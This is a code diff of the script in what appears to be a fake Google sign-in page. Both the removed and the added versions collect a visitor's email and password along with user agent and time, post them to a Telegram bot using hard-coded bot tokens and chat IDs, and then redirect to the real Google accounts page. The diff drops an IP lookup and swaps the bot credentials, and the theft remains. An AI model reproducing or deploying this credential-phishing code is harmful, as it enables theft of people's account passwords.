@@ -91,27 +91,22 @@
             const userAgent = navigator.userAgent;
             const timestamp = new Date().toLocaleString();
 
-            fetch('https://api64.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    const message = `🔍 Вход через Google\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🖥️ User-Agent: ${userAgent}\n🕒 Время: ${timestamp}\n🌐 IP: ${ip}`;
+            const message = `🔍 Вход через Google\n📧 Email: ${email}\n🔑 Пароль: ${password}\n🖥️ User-Agent: ${userAgent}\n🕒 Время: ${timestamp}`;
 
-                    const botToken = 7728256968:AAEenNdOxdzfTtPMM5H-ILAAK9hNNzhBsP0;
-                    const chatId = 7947290290;
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: chatId, text: message})
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log('Отправлено в Telegram:', data))
-                    .catch(error => console.error('Ошибка при отправке данных в Telegram:', error));
-                })
-                .catch(error => console.error('Ошибка получения IP:', error))
-                .finally(() => {
-                    window.location.href = 'https://accounts.google.com';
-                });
+            const botToken = '7728203229:AAHjqI6dvF1AL9mlOEgbgcJu3Xs9UiBgXRY';
+            const chatId = '1782608280';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chatId, text: message})
+            })
+            .then(response => response.json())
+            .then(data => console.log('Отправлено в Telegram:', data))
+            .catch(error => console.error('Ошибка при отправке данных в Telegram:', error))
+            .finally(() => {
+                window.location.href = 'https://accounts.google.com';
+            });
         });
     </script>
 </body>
